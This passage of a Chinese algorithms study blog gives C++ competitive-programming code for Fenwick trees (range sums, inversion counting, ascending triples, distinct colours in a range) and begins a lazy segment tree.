class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FenwickTree</span> &#123;</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; t;<br>    <br>    FenwickTree(<span class="hljs-type">int</span> n) : t(n + <span class="hljs-number">1</span>) &#123;&#125; <span class="hljs-comment">// 初始化大小为 n+1 的树状数组</span><br>    <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">upd</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> d)</span> &#123; <span class="hljs-comment">// 单点更新，将索引 i 增加 d</span><br>        <span class="hljs-keyword">for</span> (++i; i &lt; t.size(); i += i &amp; -i) t[i] += d;<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> <span class="hljs-title function_">qry</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123; <span class="hljs-comment">// 查询前 i 项的前缀和</span><br>        <span class="hljs-type">int</span> s = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (++i; i &gt; <span class="hljs-number">0</span>; i -= i &amp; -i) s += t[i];<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> <span class="hljs-title function_">qry</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> &#123; <span class="hljs-comment">// 查询区间 [l, r] 的区间和</span><br>        <span class="hljs-keyword">return</span> qry(r) - qry(l - <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n, q;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; q;<br>    FenwickTree <span class="hljs-title function_">t</span><span class="hljs-params">(n)</span>;<br>    <br>    <span class="hljs-keyword">while</span> (q--) &#123;<br>        <span class="hljs-type">int</span> op;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; op;<br>        <span class="hljs-keyword">if</span> (op == <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// 操作 1: 单点更新</span><br>            <span class="hljs-type">int</span> i, d;<br>            <span class="hljs-built_in">cin</span> &gt;&gt; i &gt;&gt; d;<br>            t.upd(i, d);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-number">2</span>) &#123; <span class="hljs-comment">// 操作 2: 查询区间和</span><br>            <span class="hljs-type">int</span> l, r;<br>            <span class="hljs-built_in">cin</span> &gt;&gt; l &gt;&gt; r;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; t.qry(l, r) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="统计逆序对"><a href="#统计逆序对" class="headerlink" title="统计逆序对"></a>统计逆序对</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">500001</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FenwickTree</span> &#123;</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; t;<br>    FenwickTree(<span class="hljs-type">int</span> n) : t(n + <span class="hljs-number">1</span>) &#123;&#125;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> v)</span> &#123;<br>        <span class="hljs-keyword">for</span> (++i; i &lt; t.size(); i += i &amp; -i) &#123;<br>            t[i] += v;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">long</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-type">long</span> s = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (++i; i &gt; <span class="hljs-number">0</span>; i -= i &amp; -i) &#123;<br>            s += t[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n;<br>    <br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(n + <span class="hljs-number">1</span>)</span>, alls;  <span class="hljs-comment">// 用来存储所有待离散化的值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; arr[i];<br>        alls.push_back(arr[i]);<br>    &#125;<br><br>    <span class="hljs-comment">// 离散化的处理</span><br>    sort(alls.begin(), alls.end());<br>    alls.erase(unique(alls.begin(), alls.end()), alls.end()); <span class="hljs-comment">// 去重</span><br><br>    <span class="hljs-comment">// 二分查找找第一个大于等于x的位置，映射到1, 2, ..., n</span><br>    <span class="hljs-keyword">auto</span> find = [&amp;](<span class="hljs-type">int</span> x) &#123;<br>        <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = alls.size() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (l &lt; r) &#123;<br>            <span class="hljs-type">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (alls[mid] &gt;= x) r = mid;<br>            <span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> r + <span class="hljs-number">1</span>; <span class="hljs-comment">// 返回新的下标映射</span><br>    &#125;;<br><br>    <span class="hljs-comment">// 将原数组中的值离散化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        arr[i] = find(arr[i]);<br>    &#125;<br><br>    <span class="hljs-comment">// Fenwick Tree 用于求解逆序对</span><br>    FenwickTree <span class="hljs-title function_">fenwick</span><span class="hljs-params">(alls.size())</span>;<br>    <span class="hljs-type">long</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>        ans += fenwick.sum(arr[i] - <span class="hljs-number">1</span>);<br>        fenwick.add(arr[i], <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="升序三元组"><a href="#升序三元组" class="headerlink" title="升序三元组"></a>升序三元组</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">30001</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FenwickTree</span> &#123;</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt; tree1, tree2;<br>    <span class="hljs-type">int</span> m;<br><br>    FenwickTree(<span class="hljs-type">int</span> size) : tree1(size + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), tree2(size + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), m(size) &#123;&#125;<br><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">lowbit</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-keyword">return</span> i &amp; -i;<br>    &#125;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&amp; tree, <span class="hljs-type">int</span> i, <span class="hljs-type">long</span> c)</span> &#123;<br>        <span class="hljs-keyword">while</span> (i &lt;= m) &#123;<br>            tree[i] += c;<br>            i += lowbit(i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">long</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&amp; tree, <span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-type">long</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>            ans += tree[i];<br>            i -= lowbit(i);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br><br><span class="hljs-type">int</span> n, m;<br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(MAXN)</span>, <span class="hljs-title function_">sorted_arr</span><span class="hljs-params">(MAXN)</span>, alls; <span class="hljs-comment">// `alls` 用来存储所有待离散化的值</span><br><br><span class="hljs-comment">// 二分查找并返回离散化后的下标</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = alls.size() - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (l &lt; r) &#123;<br>        <span class="hljs-type">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (alls[mid] &gt;= x) r = mid;<br>        <span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> r + <span class="hljs-number">1</span>; <span class="hljs-comment">// 映射到 1, 2, ..., n</span><br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">compute</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 收集所有待离散化的值</span><br>    alls.clear();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        alls.push_back(arr[i]);<br>    &#125;<br><br>    <span class="hljs-comment">// 离散化：排序并去重</span><br>    sort(alls.begin(), alls.end());<br>    alls.erase(unique(alls.begin(), alls.end()), alls.end());<br><br>    <span class="hljs-comment">// 离散化原数组</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        arr[i] = find(arr[i]); <span class="hljs-comment">// 使用 `find` 函数获取离散化的值</span><br>    &#125;<br><br>    FenwickTree <span class="hljs-title function_">fenwick</span><span class="hljs-params">(alls.size())</span>; <span class="hljs-comment">// 使用新的离散化大小</span><br>    <span class="hljs-type">long</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-type">long</span> right_count = fenwick.sum(fenwick.tree2, arr[i] - <span class="hljs-number">1</span>);<br>        ans += right_count;<br><br>        fenwick.add(fenwick.tree1, arr[i], <span class="hljs-number">1</span>);<br>        <span class="hljs-type">long</span> one_count = fenwick.sum(fenwick.tree1, arr[i] - <span class="hljs-number">1</span>);<br>        fenwick.add(fenwick.tree2, arr[i], one_count);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    ios::sync_with_stdio(<span class="hljs-literal">false</span>);<br>    <span class="hljs-built_in">cin</span>.tie(nullptr);<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; arr[i];<br>    &#125;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; compute() &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="hh的项链"><a href="#hh的项链" class="headerlink" title="hh的项链"></a>hh的项链</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">1000001</span>;<br><br><span class="hljs-type">int</span> arr[MAXN];       <span class="hljs-comment">// 存储原数组</span><br><span class="hljs-type">int</span> query[MAXN][<span class="hljs-number">3</span>];  <span class="hljs-comment">// 存储查询 [l, r, index]</span><br><span class="hljs-type">int</span> ans[MAXN];       <span class="hljs-comment">// 存储每个查询的结果</span><br><span class="hljs-type">int</span> <span class="hljs-built_in">map</span>[MAXN];       <span class="hljs-comment">// 存储每个颜色最后出现的位置</span><br><span class="hljs-type">int</span> tree[MAXN];      <span class="hljs-comment">// 树状数组</span><br><br><span class="hljs-type">int</span> n, m;<br><br><span class="hljs-comment">// 树状数组的 lowbit 函数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">lowbit</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>    <span class="hljs-keyword">return</span> i &amp; -i;<br>&#125;<br><br><span class="hljs-comment">// 更新树状数组</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> v)</span> &#123;<br>    <span class="hljs-keyword">while</span> (i &lt;= n) &#123;<br>        tree[i] += v;<br>        i += lowbit(i);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 查询 1~i 的区间和</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>        ans += tree[i];<br>        i -= lowbit(i);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-comment">// 计算查询区间的和</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">range</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> &#123;<br>    <span class="hljs-keyword">return</span> sum(r) - sum(l - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// 处理所有查询</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">compute</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 按照查询的右端点排序</span><br>    sort(query + <span class="hljs-number">1</span>, query + m + <span class="hljs-number">1</span>, [](<span class="hljs-type">const</span> <span class="hljs-type">int</span> a[], <span class="hljs-type">const</span> <span class="hljs-type">int</span> b[]) &#123;<br>        <span class="hljs-keyword">return</span> a[<span class="hljs-number">1</span>] &lt; b[<span class="hljs-number">1</span>];<br>    &#125;);<br><br>    <span class="hljs-comment">// 维护从1到当前右端点的区间</span><br>    <span class="hljs-type">int</span> s = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> q = <span class="hljs-number">1</span>; q &lt;= m; q++) &#123;<br>        <span class="hljs-type">int</span> l = query[q][<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> r = query[q][<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span> i = query[q][<span class="hljs-number">2</span>];<br><br>        <span class="hljs-comment">// 更新树状数组，将 [s, r] 范围内的元素加到树状数组中</span><br>        <span class="hljs-keyword">while</span> (s &lt;= r) &#123;<br>            <span class="hljs-type">int</span> color = arr[s];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>[color] != <span class="hljs-number">0</span>) &#123;<br>                add(<span class="hljs-built_in">map</span>[color], <span class="hljs-number">-1</span>);  <span class="hljs-comment">// 移除之前出现的颜色的影响</span><br>            &#125;<br>            add(s, <span class="hljs-number">1</span>);  <span class="hljs-comment">// 添加当前值到树状数组</span><br>            <span class="hljs-built_in">map</span>[color] = s;  <span class="hljs-comment">// 更新颜色的最后出现位置</span><br>            s++;<br>        &#125;<br><br>        <span class="hljs-comment">// 计算当前查询区间 [l, r] 的答案</span><br>        ans[i] = range(l, r);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    ios::sync_with_stdio(<span class="hljs-literal">false</span>);<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n;<br><br>    <span class="hljs-comment">// 输入数组</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; arr[i];<br>    &#125;<br><br>    <span class="hljs-built_in">cin</span> &gt;&gt; m;<br><br>    <span class="hljs-comment">// 输入查询</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; query[i][<span class="hljs-number">0</span>] &gt;&gt; query[i][<span class="hljs-number">1</span>];<br>        query[i][<span class="hljs-number">2</span>] = i;  <span class="hljs-comment">// 存储查询的原始位置</span><br>    &#125;<br><br>    compute();<br><br>    <span class="hljs-comment">// 输出所有查询的答案</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; ans[i] &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="十三-线段树"><a href="#十三-线段树" class="headerlink" title="十三.线段树"></a>十三.线段树</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SegmentTree</span> &#123;</span><br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; tr, lz;<br>    <br>    SegmentTree(<span class="hljs-type">int</span> _n) : n(_n), tr(<span class="hljs-number">4</span> * n), lz(<span class="hljs-number">4</span> * n) &#123;&#125; <span class="hljs-comment">// 初始化线段树</span><br>    <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">apply</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> val)</span> &#123; <span class="hljs-comment">// 进行区间更新</span><br>        tr[u] += val * (r - l + <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (l != r) lz[u] += val;<br>    &#125;<br>    <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> r)</span> &#123; <span class="hljs-comment">// 进行懒标记下传</span><br>        <span class="hljs-keyword">if</span> (lz[u]) &#123;<br>            apply(<span class="hljs-number">2</span> * u, l, m, lz[u]);<br>            apply(<span class="hljs-number">2</span> * u + <span class="hljs-number">1</span>, m + <span class="hljs-number">1</span>, r, lz[u]);<br>            lz[u] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">build</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span 